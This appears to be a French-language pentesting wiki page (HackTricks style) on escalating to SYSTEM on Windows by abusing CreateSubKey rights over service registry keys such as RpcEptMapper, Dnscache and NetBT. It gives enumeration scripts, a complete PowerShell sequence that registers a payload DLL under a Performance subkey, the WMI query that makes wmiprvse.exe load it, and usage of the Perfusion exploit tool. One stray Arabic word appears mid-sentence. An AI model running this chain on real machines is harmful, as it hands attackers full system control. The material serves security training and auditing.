# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Le post original est** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Résumé

Si vous n’avez que **`Create Subkey`** / **`AppendData/AddSubdirectory`** sur une clé de registre de service, c’est quand même une bonne piste de privesc. En général, vous **ne pouvez pas** écraser directement `ImagePath`, `ServiceDll` ou d’autres valeurs existantes, mais vous pouvez peut-être quand même créer une clé enfant **`Performance`** sous :

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Toute autre clé **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** où votre token possède **`KEY_CREATE_SUB_KEY`**

L’astuce est que Windows prend encore en charge l’ancien modèle d’enregistrement **PerfLib V1**. Si un service a une sous-clé **`Performance`**, Windows peut charger une DLL depuis là lorsqu’un consommateur de compteurs de performance demande des données.

D’après la documentation Microsoft, l’enregistrement minimal est :
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Donc le point à retenir offensif est : **ne rejette pas un service registry finding simplement parce que tu as seulement `CreateSubKey` au lieu de `SetValue`**.

## Pourquoi c’est suffisant pour du code execution

Le sous-clé `Performance` n’existe généralement **pas** par défaut sur ces services, donc **`KEY_CREATE_SUB_KEY`** est le primitive dont tu as besoin. Une fois que la clé existe et contient `Library`/`Open`/`Collect`/`Close`, n’importe quel **performance counter consumer** peut déclencher le chargement de la DLL.

Quelques détails importants :

- La valeur **`Library`** peut pointer vers un **chemin complet de DLL**.
- La DLL doit exporter **`OpenPerfData`**, **`CollectPerfData`** et **`ClosePerfData`** et retourner `ERROR_SUCCESS`.
- Le code s’exécute dans le **contexte du consumer**, **pas nécessairement dans le processus du service vulnérable lui-même**.
- Dans le cas classique `RpcEptMapper` / `Dnscache`, une **WMI performance query** peut faire charger la DLL par **`wmiprvse.exe`** en tant que **`NT AUTHORITY\SYSTEM`**.

C’est pour ça que ce primitive est facile à manquer pendant le triage : la clé parent du service n’est pas « entièrement writable », mais elle reste weaponizable.

## Quick enumeration

Vérification manuelle avec **AccessChk** :
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Exemple PowerShell pour rechercher des principaux à faibles privilèges avec **`CreateSubKey`** sur les clés de service :
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Outils utiles :

- **PrivescCheck** : `Get-ModifiableRegistryPath` a été créé spécifiquement pour repérer cette classe de problème.
- **SharpUp** : `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion** : automatise le dépôt de DLL, l’enregistrement `Performance`, le déclenchement WMI, la duplication de token et le nettoyage sur les cibles vulnérables héritées (par exemple : `Perfusion.exe -c cmd -i -k Dnscache`).

## Flux d’abus

Créez la sous-clé `Performance` et renseignez les valeurs requises :
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Puis déclenchez un consommateur de performance **privilégié**. Un exemple classique est une requête WMI sur les classes `Win32_Perf*` :
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Notes opérationnelles :

- Lancement de **`perfmon.exe`** est utile pour vérifier que l’enregistrement du compteur est correct, mais cela charge généralement la DLL uniquement dans **votre propre contexte utilisateur**.
- Pour une LPE réelle, déclenchez un consommateur **privilégié** tel que **WMI**.
- Si vous écrivez votre propre exploit, lancer `cmd.exe` directement depuis la DLL vous laisse généralement avec un shell dans la **session 0**. `Perfusion` résout cela en dupliquant le jeton privilégié dans un processus qui a été créé en état suspendu dans la session de l’attaquant.
- Faites correspondre l’architecture de la DLL au consommateur cible (**x64 sur les systèmes x64**).

## Notes de version / évolutions récentes

Historiquement, les clés faibles intégrées étaient :

- **Windows 7 / Windows Server 2008 R2** : `RpcEptMapper` et `Dnscache`
- **Windows 8 / Windows Server 2012** : `RpcEptMapper`

`Perfusion` note que les mises à jour d’**avril 2021** ont supprimé le chemin d’exploitation facile sur **Windows 8 / Windows Server 2012** mis à jour, tandis que **Windows 7 / Windows Server 2008 R2** restait exploitable via **`Dnscache`**.

Ce primitive n’est **pas seulement historique**. En **janvier 2025**, Microsoft a corrigé un problème AD DS مرتبط où les membres de **`Network Configuration Operators`** pouvaient créer des sous-clés sous **`Dnscache`** et **`NetBT`**, et la même idée d’**enregistrement de DLL de performance-counter** pouvait être réutilisée pour atteindre **SYSTEM** sur les systèmes pris en charge.

La leçon moderne est donc générique : chaque fois qu’un principal à faible privilège a **`CreateSubKey`** sur **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, vérifiez si une clé enfant **`Performance`** suffit avant de rejeter le finding.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
